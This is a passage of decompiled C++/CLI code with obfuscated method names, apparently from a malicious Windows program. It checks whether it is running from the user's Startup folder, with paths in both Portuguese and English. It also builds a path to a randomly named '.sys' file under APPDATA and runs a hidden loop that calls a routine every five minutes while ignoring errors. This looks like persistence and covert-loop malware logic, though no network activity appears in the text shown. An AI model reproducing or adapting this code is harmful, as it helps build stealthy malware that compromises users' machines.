              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar9);
              \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar4 + 8), \u003CModule\u003E.getenv((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0M\u0040DPNKMMOG\u0040USERPROFILE\u003F\u0024AA\u0040)), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0CE\u0040HKMOADCA\u0040\u003F2Menu\u003F5Iniciar\u003F2Programas\u003F2Iniciali\u0040);
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar10;
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar4, &stdAllocatorChar10);
              bool flag;
              // ISSUE: fault handler
              try
              {
                flag = \u003CModule\u003E.std\u002Eoperator\u003D\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(stdAllocatorCharPtr, &stdAllocatorChar3);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar10);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar10);
              if (!flag)
                goto label_75;
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar4);
            }
            \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar4);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar3);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar3);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar2);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar1);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar1);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
    }
    \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT1);
    return false;
label_75:
    // ISSUE: fault handler
    try
    {
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          // ISSUE: fault handler
          try
          {
            // ISSUE: fault handler
            try
            {
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar11;
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar11, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_00CNPNBAHC\u0040\u003F\u0024AA\u0040);
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar4, &stdAllocatorChar11);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar11);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar11);
              \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar4 + 8), \u003CModule\u003E.getenv((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0M\u0040DPNKMMOG\u0040USERPROFILE\u003F\u0024AA\u0040)), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BN\u0040KJPOONAI\u0040\u003F2Start\u003F5Menu\u003F2Programs\u003F2Startup\u003F\u0024AA\u0040);
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar12;
              basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr = \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar4, &stdAllocatorChar12);
              bool flag;
              // ISSUE: fault handler
              try
              {
                flag = \u003CModule\u003E.std\u002Eoperator\u003D\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(stdAllocatorCharPtr, &stdAllocatorChar3);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar12);
              }
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar12);
              if (!flag)
                goto label_92;
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar4);
            }
            \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar4);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar3);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar3);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar2);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar1);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar1);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
    }
    \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT1);
    return false;
label_92:
    // ISSUE: fault handler
    try
    {
      // ISSUE: fault handler
      try
      {
        // ISSUE: fault handler
        try
        {
          // ISSUE: fault handler
          try
          {
            \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar4);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar3);
          }
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar3);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar2);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar1);
      }
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar1);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
    }
    \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT1);
    return true;
  }

  internal static unsafe basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* TSNofcmhcm(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0)
  {
    uint num1;
    // ISSUE: fault handler
    try
    {
      num1 = 0U;
      allocator\u003Cwchar_t\u003E allocatorWcharT1;
      allocator\u003Cwchar_t\u003E* allocatorWcharTPtr = \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(&allocatorWcharT1);
      allocator\u003Cwchar_t\u003E allocatorWcharT2;
      \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(&allocatorWcharT2, allocatorWcharTPtr);
      void* voidPtr = \u003CModule\u003E.@new(4U);
      _Aux_cont* auxContPtr1 = (_Aux_cont*) voidPtr;
      vector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT;
      _Aux_cont* auxContPtr2;
      // ISSUE: fault handler
      try
      {
        if ((IntPtr) voidPtr != IntPtr.Zero)
        {
          *(int*) voidPtr = (int) &stdAllocatorWcharT;
          auxContPtr2 = (_Aux_cont*) voidPtr;
        }
        else
          auxContPtr2 = (_Aux_cont*) 0;
      }
      __fault
      {
        \u003CModule\u003E.delete((void*) auxContPtr1, voidPtr);
      }
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ref stdAllocatorWcharT = (int) auxContPtr2;
      // ISSUE: fault handler
      try
      {
        \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D((allocator\u003Cwchar_t\u003E*) ((IntPtr) &stdAllocatorWcharT + 8), allocatorWcharTPtr);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Container_base_aux_alloc_real\u003Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
      }
      // ISSUE: fault handler
      try
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &stdAllocatorWcharT + 12) = 0;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &stdAllocatorWcharT + 16) = 0;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &stdAllocatorWcharT + 20) = 0;
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Vector_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
      }
      // ISSUE: fault handler
      try
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        int num2 = ^(int&) ((IntPtr) &stdAllocatorWcharT + 16) - ^(int&) ((IntPtr) &stdAllocatorWcharT + 12) >> 1;
        uint moduleFileNameW;
        do
        {
          uint _Newsize = (uint) (num2 + 260);
          \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eresize(&stdAllocatorWcharT, _Newsize, char.MinValue);
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          uint num3 = (uint) (^(int&) ((IntPtr) &stdAllocatorWcharT + 16) - ^(int&) ((IntPtr) &stdAllocatorWcharT + 12) >> 1);
          moduleFileNameW = \u003CModule\u003E.GetModuleFileNameW((HINSTANCE__*) 0, \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eat(&stdAllocatorWcharT, 0U), num3);
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          num2 = ^(int&) ((IntPtr) &stdAllocatorWcharT + 16) - ^(int&) ((IntPtr) &stdAllocatorWcharT + 12) >> 1;
        }
        while (moduleFileNameW >= (uint) num2);
        \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eresize(&stdAllocatorWcharT, moduleFileNameW, char.MinValue);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        char* chPtr1 = (char*) ^(int&) ((IntPtr) &stdAllocatorWcharT + 16);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if ((uint) ^(int&) ((IntPtr) &stdAllocatorWcharT + 12) > (uint) ^(int&) ((IntPtr) &stdAllocatorWcharT + 16))
          \u003CModule\u003E._invalid_parameter_noinfo();
        _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _Last;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref _Last = ^(int&) ref stdAllocatorWcharT;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &_Last + 4) = (int) chPtr1;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        char* chPtr2 = (char*) ^(int&) ((IntPtr) &stdAllocatorWcharT + 12);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if ((uint) ^(int&) ((IntPtr) &stdAllocatorWcharT + 12) > (uint) ^(int&) ((IntPtr) &stdAllocatorWcharT + 16))
          \u003CModule\u003E._invalid_parameter_noinfo();
        _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _First;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref _First = ^(int&) ref stdAllocatorWcharT;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &_First + 4) = (int) chPtr2;
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D\u003Cclass\u0020std\u003A\u003A_Vector_iterator\u003Cwchar_t\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E(obj0, _First, _Last);
        num1 = 1U;
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
      }
      // ISSUE: fault handler
      try
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (^(int&) ((IntPtr) &stdAllocatorWcharT + 12) != 0)
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002Edeallocate((allocator\u003Cwchar_t\u003E*) ((IntPtr) &stdAllocatorWcharT + 8), (char*) ^(int&) ((IntPtr) &stdAllocatorWcharT + 12), (uint) (^(int&) ((IntPtr) &stdAllocatorWcharT + 20) - ^(int&) ((IntPtr) &stdAllocatorWcharT + 12) >> 1));
        }
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &stdAllocatorWcharT + 12) = 0;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &stdAllocatorWcharT + 16) = 0;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &stdAllocatorWcharT + 20) = 0;
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Vector_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
      }
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      \u003CModule\u003E.delete((void*) ^(int&) ref stdAllocatorWcharT);
      return obj0;
    }
    __fault
    {
      if (((int) num1 & 1) != 0)
      {
        uint num4 = num1 & 4294967294U;
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) obj0);
      }
    }
  }

  internal static unsafe void hRIjKIzPepMzZhvBJ(List<object> gfy)
  {
    // ISSUE: untyped stack allocation
    int num1 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    while (true)
    {
      try
      {
        \u003CModule\u003E.xyikkDXVErb();
      }
      catch (Exception ex)
      {
      }
      catch (Exception ex1) when (
      {
        // ISSUE: unable to correctly present filter
        exception* exceptionPtr;
        if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) &\u003CModule\u003E.\u003F\u003F_R0PAVexception\u0040std\u0040\u0040\u00408, 0, (void*) &exceptionPtr) != 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        uint num2 = 0;
        \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
        try
        {
          try
          {
          }
          catch (Exception ex2) when (
          {
            // ISSUE: unable to correctly present filter
            num2 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
            if (num2 != 0U)
            {
              SuccessfulFiltering;
            }
            else
              throw;
          }
          )
          {
          }
          goto label_12;
          if (num2 != 0U)
            throw;
        }
        finally
        {
          \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num2);
        }
      }
label_12:
      \u003CModule\u003E.Sleep(300000U);
    }
  }

  internal static unsafe int XCjgCkZ(sbyte* ySy)
  {
    // ISSUE: untyped stack allocation
    int num1 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar1;
    \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar1, 3, 1);
    byte num2 = 0;
    // ISSUE: fault handler
    try
    {
      \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar1 + 8), \u003CModule\u003E.getenv((sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_07FMLNDKFM\u0040APPDATA\u003F\u0024AA\u0040)), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BP\u0040NNJAMPBP\u0040\u003F26s5d41g65s4g65d6tr465465t\u003F4sys\u003F\u0024AA\u0040);
      basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar2;
